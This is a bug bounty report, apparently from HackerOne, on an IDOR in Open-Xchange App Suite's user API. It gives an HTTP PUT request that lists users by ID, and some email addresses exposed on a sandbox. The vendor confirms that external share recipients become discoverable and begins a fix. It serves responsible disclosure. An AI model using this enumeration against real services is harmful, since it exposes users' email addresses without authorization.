title: IDOR allow to extract all registered email

profile.name: Open-Xchange
profile.about: Messaging, collaboration and office productivity software for service providers

vulnerability_information:
STEP TO REPRODUCE
=============================
vulnerable request....

```
PUT /appsuite/api/user?action=list&columns=1%2C20%2C500%2C501%2C502%2C505%2C524%2C555%2C606%2C614&session=144ebd4f736c475f9e7d681c07a6a50a&timezone=utc HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: text/javascript; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/
Content-Length: 3
Cookie: .........
Connection: close

[ID]
```
in this postdata ,enter id from 1 to 10 and you can identify which user has with this id.
Response Body  look like......

```
{"data":[[6,6,"user4","user4","user4",null,6,"user4@sandbox-3.open-xchange.com",null,5]],"timestamp":1502392133914}
```
I find out that id 8 has email test123@yopmail.com and  id 2 has email admin-sandbox3@sandbox3.open-xchange.com


**If this is expected behaviour ,plz let me know , i will close this report.

## Impact

attacker can enumerate all email via IDOR.

STEP TO REPRODUCE

vulnerable request....

PUT /appsuite/api/user?action=list&columns=1%2C20%2C500%2C501%2C502%2C505%2C524%2C555%2C606%2C614&session=144ebd4f736c475f9e7d681c07a6a50a&timezone=utc HTTP/1.1

X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/
Content-Length: 3
Cookie: .........
Connection: close

[ID]

in this postdata ,enter id from 1 to 10 and you can identify which user has with this id.
Response Body look like......

{"data":[[6,6,"user4","user4","user4",null,6,"user4@sandbox-3.open-xchange.com",null,5]],"timestamp":1502392133914}

I find out that id 8 has email test123@yopmail.com and id 2 has email admin-sandbox3@sandbox3.open-xchange.com

**If this is expected behaviour ,plz let me know , i will close this report.

Impact

attacker can enumerate all email via IDOR.

activities.message: Thanks for the report, this behaviour is by design to enable collaboration between users. You can fetch the same data when checking out "Global Address Book" at Contacts.
activities.markdown_message: Thanks for the report, this behaviour is by design to enable collaboration between users. You can fetch the same data when checking out "Global Address Book" at Contacts.

activities.message: ok, can you plz check my other report https://hackerone.com/reports/302543 ?
activities.markdown_message: ok, can you plz check my other report https://hackerone.com/reports/302543 ?

activities.message:
Hello, 
i just checked that in "Global Address Book" those two email address id 8 has test123@yopmail.com and id 2 has 
email admin-sandbox3@sandbox3.open-xchange.com are not showing there. those email can be retrived only via this IDOR.
can you plz recheck it?
activities.markdown_message:
Hello,
i just checked that in "Global Address Book" those two email address id 8 has test123@yopmail.com and id 2 has
email admin-sandbox3@sandbox3.open-xchange.com are not showing there. those email can be retrived only via this IDOR.
can you plz recheck it?

activities.message: Please point out which user account you did use to do this.
activities.markdown_message: Please point out which user account you did use to do this.

activities.message:
```
id=3 email=user1@sandbox-3.open-xchange.com
id=4 email=user2@sandbox-3.open-xchange.com
id=5 email=user3@sandbox-3.open-xchange.com
id=6 email=user4@sandbox-3.open-xchange.com
id=7 email=user5@sandbox-3.open-xchange.com
```
all this users are visible through  "Global Address Book". But 
```
id=2 email=admin-sandbox3@sandbox3.open-xchange.com
id=8 email=test123@yopmail.com
```
 this two users are not visible through 'Global address book' only via this IDOR.
activities.markdown_message:

id=7 email=user5@sandbox-3.open-xchange.com

all this users are visible through "Global Address Book". But 

id=2 email=admin-sandbox3@sandbox3.open-xchange.com
id=8 email=test123@yopmail.com

this two users are not visible through 'Global address book' only via this IDOR.

activities.message: Thanks, "test123@yopmail.com" was indeed created by another user as contact, we'll check the conditions why this contact becomes visible. "admin-sandbox" is a system account that is just filtered by the frontend, we're aware that its exposed by the API which is fine.
activities.markdown_message: Thanks, "test123@yopmail.com" was indeed created by another user as contact, we'll check the conditions why this contact becomes visible. "admin-sandbox" is a system account that is just filtered by the frontend, we're aware that its exposed by the API which is fine.

activities.message: Alright, it appears that another user at the same context shared a file or folder with "test123@yopmail.com". When doing so we create a low privilege temporary user-account for external "users". That way the former contact gets a userid assigned and can be discovered via the "user" API.
activities.markdown_message: Alright, it appears that another user at the same context shared a file or folder with "test123@yopmail.com". When doing so we create a low privilege temporary user-account for external "users". That way the former contact gets a userid assigned and can be discovered via the "user" API.

activities.message:
Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?

Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?
